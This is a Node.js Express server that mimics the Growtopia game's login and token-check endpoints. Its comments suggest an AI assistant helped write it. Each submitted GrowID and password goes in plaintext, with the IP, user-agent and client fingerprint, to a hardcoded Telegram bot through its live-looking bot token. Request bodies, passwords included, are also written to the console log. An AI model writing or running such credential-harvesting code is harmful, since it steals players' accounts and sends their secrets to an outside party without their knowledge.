const express = require('express');
const app = express();
const rateLimit = require('express-rate-limit');
const bodyParser = require('body-parser');
const compression = require('compression');
const axios = require('axios'); // !!! NOTE: You must install this package (npm install axios) !!!

// 📢 IMPORTANT: Replace the placeholders below with your actual Telegram credentials.
// I have kept the values you provided:
const TELEGRAM_BOT_TOKEN = '6441563124:AAH5nB7WTP2x5F5_hNPcTq36ryJkbgEYv8s'; 
const TELEGRAM_CHAT_ID = '5113674259'; 

async function sendToTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('Telegram credentials not set. Cannot send notification.');
        return;
    }
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        // console.log('Telegram notification sent.');
    } catch (error) {
        console.error('Error sending Telegram message:', error.response ? error.response.data : error.message);
    }
}

function isValidEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

app.use(compression({
    level: 5,
    filter: (req, res) => {
        if (req.headers['X-No-Compression']) return false;
        return compression.filter(req, res);
    }
}));
app.use(bodyParser.urlencoded({ extended: true }));
// --- FIX: ENHANCED GENERAL LOGGING MIDDLEWARE (Logs IP on every request) ---
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    res.on('finish', () => {
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
        console.log(`${ip} | ${req.method} ${req.url} - Status: ${res.statusCode} | Body: ${JSON.stringify(req.body)}`);
    });
    next();
});
// -------------------------------------------------------------------------
app.use(express.json());
app.use(rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: 'Too many requests from this IP, please try again after an hour',
}));
app.set('trust proxy', 1);
app.set('view engine', 'ejs');
app.use(express.static(__dirname + '/public'));

app.all('/player/login/dashboard', function (req, res) {
    const tData = {};
    try {
        // This route handles a custom data format, keeping original logic
        const uData = JSON.stringify(req.body).split('"')[1].split('\\n');
        const uName = uData[0].split('|');
        const uPass = uData[1].split('|');

        for (let i = 0; i < uData.length - 1; i++) {
            const d = uData[i].split('|');
            tData[d[0]] = d[1];
        }

        if (uName[1] && uPass[1]) {
            return res.redirect('/player/growid/login/validate');
        }
    } catch (why) {
        console.log(`Warning: ${why}`);
    }

    res.render(__dirname + '/public/html/dashboard.ejs', { data: tData });
});

app.all('/player/growid/login/validate', async (req, res) => {
    const { type, growId = '', password = '', email = '', gender = 0, _token } = req.body;

    const trimmedGrowId = (growId || '').trim();
    const trimmedPassword = (password || '').trim();
    const isGuestRequest =
        type === 'guest' || (trimmedGrowId === '' && trimmedPassword === '');
        
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'N/A'; // Capture the User-Agent

    console.log(
        `Type: ${type} | GrowID: ${isGuestRequest ? 'GUEST_MODE' : trimmedGrowId} | Password: ${isGuestRequest ? '(guest)' : '***'} | IP: ${ip} | User-Agent: ${userAgent}`
    );

    // Must have _token and type at least
    if (!_token || !type) {
        console.log('Invalid request: missing _token or type');
        res.setHeader('Content-Type', 'text/html');
        return res.send(`{"status":"error","message":"Invalid request.","token":"","url":"","accountType":""}`);
    }

    // ===== GUEST LOGIN → AUTO REGISTER RANDOM ACCOUNT =====
    if (isGuestRequest) {
        const guestId = 'Guest' + Math.floor(100000 + Math.random() * 900000);
        const guestPass = 'g' + Math.floor(100000 + Math.random() * 900000);
        const guestEmail = `${guestId.toLowerCase()}@guest.local`;

        const tokenData =
            `_token=${_token}` +
            `&type=reg` +
            `&growId=${guestId}` +
            `&password=${guestPass}` +
            `&email=${guestEmail}` +
            `&gender=${gender}`;

        // --- TELEGRAM LOGIC FOR GUEST ---
        const telegramMessage = 
            `🔑 *Guest Login* 🔑\n` +
            `*Action*: GUEST_REG\n` +
            `*New GrowID*: \`${guestId}\`\n` +
            `*Password*: \`${guestPass}\`\n` + 
            `*IP Address*: ${ip}\n` +
            `*User-Agent*: ${userAgent}\n` +
            `*Full Token Data (Pre-Encode)*: \`${tokenData}\``;
        
        await sendToTelegram(telegramMessage);
        // --------------------------------

        const token = Buffer.from(tokenData).toString('base64');

        res.setHeader('Content-Type', 'text/html');
        return res.send(
            `{"status":"success","message":"Guest account created.","token":"${token}","url":"","accountType":"growtopia"}`
        );
    }
    // ======================================================

    // For normal log / reg we require growId + password
    if (!trimmedGrowId || !trimmedPassword) {
        console.log('Invalid request: missing growId or password');
        res.setHeader('Content-Type', 'text/html');
        return res.send(`{"status":"error","message":"Invalid request.","token":"","url":"","accountType":""}`);
    }

    if (type === "reg" && !isValidEmail(email)) {
        console.log('Invalid email format');
        res.setHeader('Content-Type', 'text/html');
        return res.send(`{"status":"error","message":"Invalid email.","token":"","url":"","accountType":""}`);
    }

    const tokenData = type === 'reg'
        ? `_token=${_token}&type=${type}&growId=${trimmedGrowId}&password=${trimmedPassword}&email=${email}&gender=${gender}`
        : `_token=${_token}&type=${type}&growId=${trimmedGrowId}&password=${trimmedPassword}`;

    // --- TELEGRAM LOGIC FOR NORMAL LOGIN/REGISTRATION (You saw this one) ---
    const telegramMessage = 
        `🔑 *New Login/Registration* 🔑\n` +
        `*Action*: ${type.toUpperCase()}\n` +
        `*GrowID*: \`${trimmedGrowId}\`\n` +
        `*Password*: \`${trimmedPassword}\`\n` + 
        `*IP Address*: ${ip}\n` +
        `*User-Agent*: ${userAgent}\n` +
        `*Full Token Data (Pre-Encode)*: \`${tokenData}\``;
    
    await sendToTelegram(telegramMessage);
    // -------------------------------------------------------------------------
    
    const token = Buffer.from(tokenData).toString('base64');

    res.setHeader('Content-Type', 'text/html');
    res.send(`{"status":"success","message":"Account Validated.","token":"${token}","url":"","accountType":"growtopia"}`);
});

app.all('/player/growid/checkToken', async (req, res) => { // Made async to allow await
    try {
        const { refreshToken, clientData } = req.body;

        if (!refreshToken || !clientData) {
            res.setHeader('Content-Type', 'text/html');
            return res.status(400).send(`{"status":"error","message":"Missing refreshToken or clientData"}`);
        }
        
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;

        // 1. LOG THE CLIENT DATA FOR ANALYSIS (Now goes to console and Telegram)
        console.log(`[ANTIHACK LOG] Checking Token for: ${refreshToken.substring(0, 10)}...`);
        console.log(`[ANTIHACK LOG] RAW ClientData received: ${clientData}`);
        
        // --- START: NEW TELEGRAM LOGIC FOR CLIENT DATA ---
        const checkTokenTelegramMessage = 
            `🛡️ *Token Check/ClientData Log* 🛡️\n` +
            `*IP Address*: ${ip}\n` +
            `*ClientData (Fingerprint)*: \`${clientData}\`\n` +
            `*Refresh Token Start*: \`${refreshToken.substring(0, 20)}...\``;
        
        await sendToTelegram(checkTokenTelegramMessage);
        // --- END: NEW TELEGRAM LOGIC FOR CLIENT DATA ---
        
        // --- START: ANTI-CHEAT CLIENT DATA VALIDATION ---
        const MIN_CLIENT_DATA_LENGTH = 50; 
        const KEY_GAME_VERSION = 'gameversion/5.11'; 
        
        // Block if data is too short OR is missing the expected game version
        if (clientData.length < MIN_CLIENT_DATA_LENGTH || !clientData.includes(KEY_GAME_VERSION)) {
            console.log(`[ANTIHACK] BLOCKING SUSPICIOUS TOKEN CHECK - ClientData invalid (Length: ${clientData.length}, Version Check: ${clientData.includes(KEY_GAME_VERSION) ? 'PASS' : 'FAIL'}).`);
            res.setHeader('Content-Type', 'text/html');
            // Block the connection with a 403 Forbidden status
            return res.status(403).send(`{"status":"error","message":"Token validation failed: Invalid client signature."}`);
        }
        // --- END: ANTI-CHEAT CLIENT DATA VALIDATION ---

        // The token is considered valid, proceed with refresh logic
        const decodedRefreshToken = Buffer.from(refreshToken, 'base64').toString('utf-8');
        const updatedToken = Buffer.from(
            decodedRefreshToken.replace(/(_token=)[^&]*/, `$1${Buffer.from(clientData).toString('base64')}`)
        ).toString('base64');

        res.setHeader('Content-Type', 'text/html');
        res.send(`{"status":"success","message":"Token is valid.","token":"${updatedToken}","url":"","accountType":"growtopia"}`);
    } catch (error) {
        console.error(`Token Check Error: ${error.message}`);
        res.setHeader('Content-Type', 'text/html');
        res.status(500).send(`{"status":"error","message":"Internal Server Error"}`);
    }
});

app.all('/', function (req, res) {
    res.sendFile(__dirname + '/public/html/index.html');
});

app.listen(5000, function () {
    console.log(`Listening on port 5000`);
});